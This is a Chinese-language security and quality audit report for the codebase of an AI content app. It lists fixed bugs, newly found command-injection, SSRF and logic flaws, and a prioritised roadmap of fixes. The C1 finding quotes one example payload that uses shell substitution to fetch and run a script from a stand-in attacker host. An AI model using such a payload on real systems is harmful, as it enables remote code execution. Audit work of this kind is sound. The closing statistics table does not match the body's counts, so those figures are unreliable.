# 灵集AI — 全面功能·质量·架构分析报告

> 版本: V2.0（更新版）
> 日期: 2026-06-13
> 基于: 灵集AI 代码库 commit `406aa47` + 三轮优化后工作树状态
> 审查方式: 4 路并行 Agent 全面扫描 35+ 文件

---

## 目录

1. [已修复问题清单](#1-已修复问题清单)
2. [新发现：严重安全漏洞](#2-新发现严重安全漏洞)
3. [新发现：高优先级 Bug](#3-新发现高优先级-bug)
4. [新发现：中等优先级问题](#4-新发现中等优先级问题)
5. [新发现：低优先级改进](#5-新发现低优先级改进)
6. [优化路线图](#6-优化路线图)

---

## 1. 已修复问题清单

三轮优化已完成 21 项修复：

### 🔴 严重 Bug（7 项）✅

| # | 问题 | 修复方式 |
|---|------|---------|
| B1 | stream.ts presets 缺失 | 工作树已修复 |
| B2 | search_internet 命令注入 | `exec()` → `execFile()` |
| B3 | syncAll 空存根 | 已实现完整同步 + `onSessionEnd` |
| B4 | 任务并发限制未生效 | `claimNext` 加入 processing 计数过滤 |
| B5 | Cron 频率不匹配 | ecs-crontab 改为 `*/5 * * * *` |
| B6 | 4 种 TaskType 无 handler | 全部实现并注册 |
| B7 | picsum.photos 开发回退 | 替换为正式错误返回 |

### 🟡 中等 Bug（5 项）✅

| # | 问题 | 修复方式 |
|---|------|---------|
| B8 | triggerKeywords 未使用 | matcher.ts 加入关键词匹配逻辑 |
| B9 | Skills 未集成 Pipeline | pipeline.ts 集成 SkillsHub |
| B10 | 意图检测无对话上下文 | intent.ts 读取 historyMessages |
| B11 | Agent 默认配置冲突 | 统一为 deepseek-v4-pro |
| S2 | wttr.in HTTP | 改为 HTTPS |

### 🟢 代码质量（9 项）✅

| # | 问题 | 修复方式 |
|---|------|---------|
| Q1 | 错误处理不统一 | 新建 errors.ts (AIServiceError + safeErrorText + normalizeError) |
| Q2 | Python 路径重复 | 提取 douyin-python.ts 共享函数 |
| Q3 | AI 服务无重试 | 新建 retry.ts + ModelRouter 集成 |
| Q5 | parallelizer 死代码 | loop.ts 集成 groupToolCallsForExecution |
| Q6 | Token 估算粗糙 | chars/3 → chars/2 + enforceBudget 硬限制 |
| Q7 | 本地 API 回调失败 | save 直写 DB + getApiBaseUrl 多源 fallback |
| Q8 | 通知页假数据 | fallbackNotifications 改为 [] |
| Q9 | 静态页缺导航 | support/terms/privacy 添加 BottomNav |
| Q10 | grid_images 不生成图 | 生成方案 + 自动生成首图预览 |

### 新增基础设施文件（5 个）

| 文件 | 用途 |
|------|------|
| `src/lib/ai/retry.ts` | 指数退避重试 + 抖动 |
| `src/lib/ai/errors.ts` | 统一错误类型 + 安全文本提取 |
| `src/lib/agent/tools/api-base-url.ts` | 内部 API base URL 多源解析 |
| `src/lib/agent/tools/douyin-python.ts` | 抖音 CLI Python 路径共享检测 |
| `src/lib/agent/context-engine.ts` | 重写：token 预算 + 强制截断 + 中文估算 |

---

## 2. 新发现：严重安全漏洞

### 🔴 CRITICAL

#### C1. 命令注入 — YT-DLP URL Shell 替换

**位置:** [extract-content.ts:162-163](src/lib/agent/tools/builtin/extract-content.ts)
**严重程度:** CRITICAL（远程 RCE）
**攻击向量:** 恶意构造的 URL 传入 `extract_content` 工具 → `downloadViaYTDLP` → `execAsync` 执行 shell 命令

```typescript
// ❌ 当前代码 — URL 直接拼入 shell 命令
await execAsync(
  `${YTDLP_CMD} --no-playlist ... "${url}" 2>&1`
);
// 攻击: https://x.com/$(curl attacker.com/sh|sh) → shell 展开 → RCE
```

**修复:** 改用 `execFile('python3.11', ['-m', 'yt_dlp', ..., url])` — 参数数组不经过 shell。

---

### 🔴 HIGH（4 项）

#### H1. ffmpeg 命令注入（2 处）
**位置:** [extract-content.ts:280](src/lib/agent/tools/builtin/extract-content.ts), [douyin-transcript.ts:180](src/lib/agent/tools/builtin/douyin-transcript.ts)
**问题:** 视频文件路径直接拼入 shell ffmpeg 命令，文件名如含 `` ` `` 或 `$()` 即 RCE
**修复:** 所有 ffmpeg/ffprobe 改用 `execFile` + 参数数组

#### H2. douyin-python.ts find 命令注入
**位置:** [douyin-python.ts:22-24](src/lib/agent/tools/douyin-python.ts)
**问题:** `which douyin` 输出直接拼入 `find` shell 命令
**修复:** 校验路径不含元字符 + 改用 `execFile('find', [...])`

#### H3. execSync 文件操作（4 处）
**位置:** [generate-product-video.ts:306](src/lib/agent/tools/builtin/generate-product-video.ts), [compose-video.ts:297,332](src/lib/agent/tools/builtin/compose-video.ts), [video-face-swap.ts:32,48,83](src/lib/agent/tools/builtin/video-face-swap.ts)
**问题:** `execSync('rm -rf "${dir}"')` 等 shell 文件操作
**修复:** 使用 Node.js `fs.rmSync()` / `execFileSync` 替代

#### H4. Agent 流式 token 计数断裂
**位置:** [stream.ts:84-156](src/lib/agent/stream.ts)
**问题:** SSE 流式路径从不调用 `ctxEngine.updateFromResponse()`，`sessionTotalTokens` 永远为 0；`chatStreamWithTools` 不调用 `accumulateCost`，流式调用成本未追踪
**修复:** 流结束后调用 `ctxEngine.estimateTokens(messages)` 估算计数

---

## 3. 新发现：高优先级 Bug

| # | 问题 | 位置 | 影响 |
|---|------|------|------|
| H5 | **stream.ts 未集成并行工具** | [stream.ts:96](src/lib/agent/stream.ts) | 流式模式下只读工具串行执行，多 2-3 倍延迟 |
| H6 | **context-engine compress 不过滤 tool 消息** | [context-engine.ts:137](src/lib/agent/context-engine.ts) | Tool role 消息传入 `compressHistory`，JSON 数据污染摘要 |
| H7 | **tool-timeout Promise.race 未清理定时器** | [tool-timeout.ts:86-91](src/lib/agent/tool-timeout.ts) | Node.js `UnhandledPromiseRejectionWarning` |
| H8 | **intent.ts 优先级导致误判** | [intent.ts:70-103](src/lib/assistant/intent.ts) | "帮我写个视频脚本" 被 `matchWriting` 抢断而非 `matchVideo` |
| H9 | **matcher.ts 意图-类别比较反向** | [matcher.ts:97](src/lib/assistant/skills/matcher.ts) | `intent.includes(skill.category)` 而非 `category.includes(intent)` |
| H10 | **processVideoTask 提前标记完成** | [task-worker.ts:54](src/lib/jobs/task-worker.ts) | 视频提交后立即标记完成，实际生成未完成 |
| H11 | **processVideoMergeTask 是存根** | [task-worker.ts:65-71](src/lib/jobs/task-worker.ts) | 合并任务永远不实际执行 |

---

## 4. 新发现：中等优先级问题

### 4.1 功能正确性

| # | 问题 | 位置 |
|---|------|------|
| M1 | claimNext TOCTOU 竞态 — 并发计数读取与抢占非原子 | [queue.ts:144-195](src/lib/jobs/queue.ts) |
| M2 | parallelizer pathsOverlap 不检测层级重叠 (a/b vs a/b/c) | [parallelizer.ts:75-81](src/lib/agent/tools/parallelizer.ts) |
| M3 | compressHistory 每条消息截断到 200 字符再压缩，关键信息可能丢失 | [context-compressor.ts:34](src/lib/assistant/context-compressor.ts) |
| M4 | enforceBudget 可为负预算导致所有非 system 消息被丢弃 | [context-engine.ts:117](src/lib/agent/context-engine.ts) |
| M5 | estimateTokens 不计算 role:'tool' 消息的 token，低估实际用量 | [context-engine.ts:69-82](src/lib/agent/context-engine.ts) |
| M6 | syncAll 不用 Promise.allSettled，一个 provider 崩溃阻塞全部 | [manager.ts:66-82](src/lib/assistant/memory/manager.ts) |
| M7 | pipeline.ts skillInvocations 硬编码为 []，技能从不执行 | [pipeline.ts:95](src/lib/assistant/pipeline.ts) |
| M8 | TaskWorker for-of 串行处理，长任务阻塞后续任务 | [task-worker.ts:118](src/lib/jobs/task-worker.ts) |

### 4.2 安全加固

| # | 问题 | 位置 |
|---|------|------|
| M9 | SSRF — extractViaDirectFetch 无 URL 白名单/黑名单 | [extract-content.ts:104](src/lib/agent/tools/builtin/extract-content.ts) |
| M10 | hasCli() 接受任意字符串，签名危险 | [search-internet.ts:12](src/lib/agent/tools/builtin/search-internet.ts) |
| M11 | 工具参数 enum 仅在 schema 声明，handler 无运行时校验 | generate-product-video, douyin-search, grid-images |

### 4.3 代码质量

| # | 问题 | 位置 |
|---|------|------|
| M12 | TokenUsage 接口在 context-engine.ts 和 types.ts 重复定义 | 两个文件 |
| M13 | executeWithTimeout 是死代码 — 仅 executeWithTimeoutAndRecovery 有调用 | [tool-timeout.ts:70-115](src/lib/agent/tool-timeout.ts) |
| M14 | chatStream() ModelRouter 方法零调用者 | [model-router.ts:178](src/lib/providers/model-router.ts) |
| M15 | conversationalMode 字段定义但从未读取 | [types.ts:111](src/lib/agent/types.ts) |
| M16 | Doubao 函数名误导 — callDoubaoChat 实际调用 Qwen | [chat.ts](src/lib/ai/chat.ts) |
| M17 | normalError 零调用 — 导出但无人使用 | [errors.ts](src/lib/ai/errors.ts) |
| M18 | 旧 safeErrorText (constants.ts) 与新版 (errors.ts) 并存，video.ts 仍用旧版 | [constants.ts](src/lib/ai/constants.ts) |

### 4.4 前端 UX

| # | 问题 | 位置 |
|---|------|------|
| M19 | 通知页 API 失败无错误提示 — 静默显示"暂无通知"，用户无法区分空数据和加载失败 | [notification/page.tsx:61](src/app/notification/page.tsx) |
| M20 | markAllRead 乐观更新无回滚 — API 失败后 UI 与实际状态不一致 | [notification/page.tsx:68-77](src/app/notification/page.tsx) |
| M21 | support/terms/privacy handleNavigate 只有 5 个 tab case，navigation 缺失 | 三个文件 |
| M22 | 版本号、日期硬编码（'1.0.0'、'2026年6月1日'） | support/terms/privacy |

---

## 5. 新发现：低优先级改进

| # | 问题 | 位置 |
|---|------|------|
| L1 | stream.ts 死 import (updatePlanProgress) | [stream.ts:13](src/lib/agent/stream.ts) |
| L2 | task-worker.ts 死 import (onDigitalHumanCompleted) | [task-worker.ts:7](src/lib/jobs/task-worker.ts) |
| L3 | enforceBudget 中 CHARS_PER_TOKEN=2 对英文过保守 | [context-engine.ts:26](src/lib/agent/context-engine.ts) |
| L4 | api-base-url.ts 生产域名硬编码 (https://ai.zjsifan.com) | [api-base-url.ts:24](src/lib/agent/tools/api-base-url.ts) |
| L5 | 错误消息可能泄漏临时目录路径 | 多个文件 |
| L6 | support 页面无 ProtectedRoute（可能有意） | [support/page.tsx](src/app/support/page.tsx) |
| L7 | ChatMessage 类型不支持 role:'tool'，9 处 as unknown as ChatMessage 绕过 | loop.ts / stream.ts |
| L8 | 天气数据 NaN 风险 — wttr.in 返回 "--" 时 Number() = NaN | [weather.ts:47-63](src/lib/ai/weather.ts) |

---

## 6. 优化路线图

### 立即修复（本周）— 安全关键

```
C1  🔴 CRITICAL  YT-DLP 命令注入         → extract-content.ts 改用 execFile
H1  🔴 HIGH      ffmpeg 命令注入 (×2)      → 改用 execFile
H2  🔴 HIGH      douyin-python find 注入   → execFile + 校验
H3  🔴 HIGH      execSync 文件操作 (×4)    → fs.rmSync / execFileSync
```

### 短期修复（2 周内）— 功能正确性

```
H4  Agent 流式 token 计数断裂             → stream.ts 加 estimateTokens
H5  stream.ts 未集成并行工具               → 引入 groupToolCallsForExecution
H6  compress 不过滤 tool 消息              → 加 m.role !== 'tool' 过滤
H7  Promise.race 未清理定时器              → 保存 timeout ID + clearTimeout
H8  intent.ts 优先级误判                   → 重排 video/image 在 writing 之前
H9  matcher.ts 意图-类别反向               → 改比较方向
M9  SSRF 防护                              → extract-content 加 URL 白名单
M10 hasCli 输入校验                        → 加正则校验
M3  compressHistory 截断丢失信息            → 提高截断长度或按句子截断
```

### 中期优化（1 月内）— 质量提升

```
M1  任务队列 TOCTOU 竞态                   → DB 级锁或接受软限制 + 监控
M2  pathsOverlap 层级重叠                  → 加 parent/child 路径检测
M4  enforceBudget 负预算边界               → 加最小值守卫
M5  estimateTokens 缺 tool role 计算       → 补充估算
M6  syncAll Promise.allSettled             → 统一错误隔离
M7  pipeline skillInvocations              → 实现实际执行或移除占位
M19 通知页失败 UI                           → 加错误状态 + 重试按钮
M20 markAllRead 回滚                       → try-catch 中恢复状态
M16 callDoubaoChat 重命名                  → 改为 callQwenChat 或删除
M18 统一 safeErrorText (去重 constants.ts)  → 所有导入指向 errors.ts
```

### 长期优化（Q3 2026）

```
- ChatMessage 类型扩展（支持 role:'tool'）
- 知识库种子数据（50-100 条中文创作知识）
- E2E 测试覆盖（10+ 核心流程 Playwright）
- Agent 系统提示词参考 Hermes 多层模板重写
- 输出质量评分 + 多模型投票
- 子 Agent 委托架构
```

---

## 附录：问题统计总表

| 严重程度 | 已修复 | 新发现 | 合计 |
|---------|--------|--------|------|
| 🔴 CRITICAL | 0 | 1 | 1 |
| 🔴 HIGH | 7 | 5 | 12 |
| 🟡 MEDIUM | 5 | 18 | 23 |
| 🟢 LOW | 9 | 8 | 17 |
| **总计** | **21** | **31** | **53** |

---

> 📋 三轮优化已修复 21 项问题，本轮 4 路并行审查新发现 31 项。其中 1 个 CRITICAL 远程命令注入需立即修复，5 个 HIGH 安全/功能问题需本周内修复。
> 建议优先处理 C1（YT-DLP 命令注入）+ H1-H3（shell 注入全面改用 execFile）。
